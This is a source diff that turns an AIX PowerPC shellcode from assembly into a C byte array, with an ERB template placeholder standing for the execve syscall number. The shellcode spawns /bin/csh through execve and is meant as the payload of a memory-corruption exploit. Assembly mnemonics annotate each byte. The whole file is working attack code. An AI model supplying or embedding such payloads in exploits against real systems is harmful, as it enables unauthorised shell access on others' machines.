@@ -1,5 +1,5 @@
 /*
- *  aix-power-shellcode.S
+ *  aix-power-shellcode.c
  *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
  *
  *  This library is free software; you can redistribute it and/or
@@ -32,26 +32,20 @@
  *
  */
 
-#include "aix-power.h"
-
-    .globl .main
-    .csect .text[PR]
-
-.main:
-
-shellcode:
-    lil     %r29,__CAL
-    xor.    %r5,%r5,%r5
-    bnel    shellcode
-    mflr    %r30
-    cal     %r30,511(%r30)
-    cal     %r3,-511+40(%r30)
-    stb     %r5,-511+48(%r30)
-    stu     %r5,-4(%r1)
-    stu     %r3,-4(%r1)
-    mr      %r4,%r1
-    cal     %r2,__NC_execve(%r29)
-    crorc   %cr6,%cr6,%cr6
-    .long   0x44ffff02
-    .asciz  "/bin/csh"
+char shellcode[]=           /*  60 bytes                          */
+    "\x3b\xa0\x07\xff"      /*  lil     r29,2047                  */
+    "\x7c\xa5\x2a\x79"      /*  xor.    r5,r5,r5                  */
+    "\x40\x82\xff\xf9"      /*  bnel    <shellcode>               */
+    "\x7f\xc8\x02\xa6"      /*  mflr    r30                       */
+    "\x3b\xde\x01\xff"      /*  cal     r30,511(r30)              */
+    "\x38\x7e\xfe\x29"      /*  cal     r3,-471(r30)              */
+    "\x98\xbe\xfe\x31"      /*  stb     r5,-463(r30)              */
+    "\x94\xa1\xff\xfc"      /*  stu     r5,-4(r1)                 */
+    "\x94\x61\xff\xfc"      /*  stu     r3,-4(r1)                 */
+    "\x7c\x24\x0b\x78"      /*  mr      r4,r1                     */
+<%= @execve %>
+    "\x4c\xc6\x33\x42"      /*  crorc   6,6,6                     */
+    "\x44\xff\xff\x02"      /*  svca    0                         */
+    "/bin/csh"
+;
 
